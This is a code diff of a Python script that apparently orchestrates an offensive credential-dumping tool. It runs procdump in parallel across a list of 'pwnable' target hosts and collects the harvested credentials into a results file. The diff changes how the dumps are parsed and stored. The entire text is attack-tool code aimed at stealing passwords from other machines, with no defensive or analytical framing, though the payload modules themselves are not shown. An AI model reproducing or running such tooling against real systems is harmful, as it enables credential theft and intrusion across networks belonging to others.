@@ -12,11 +12,8 @@ from core.User import *
 from core.Resources import *
 from core.Targets import *
 from core.SprayLove import *
-from core.ParseDump import *
 from core.Colors import *
 from core.Utils import *
-from core.PrintCreds import *
-from core.WriteCreds import *
 from multiprocessing import Process
 
 def run(args):
@@ -27,22 +24,19 @@ def run(args):
 
     try:
         targets = listPwnableTargets(args.targets, user)
-        
-        logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s. Be patients..." % (warningGre, green, white))
+
+        logging.warning("%sExec procdump on targets. Be patients..." % (warningGre))
 
         for target in targets:
             jobs.append(Process(target=sprayLove, args=(user, target, local_ip)))
             jobs[-1].start()
-        
-        joinThreads(jobs, 1200) # wait 20 minutes max
-        credentials = parseDumps(dumpDir)
 
-        if credentials is not None:
-            print_credentials(credentials)
-            write_credentials(credentials)
+        joinThreads(jobs, 30) # wait 30 seconds max
+        logging.info("\n%sCredentials logged into: %s" % (warningGre, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'results', 'creds.txt')))
+
     except KeyboardInterrupt:
         logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
     except Exception as e:
         logging.warning("%sErr: %s" % (warningRed, e))
     finally:
-        exit_gracefully(jobs, 10, args.keep)
+        exit_gracefully(jobs, 10)
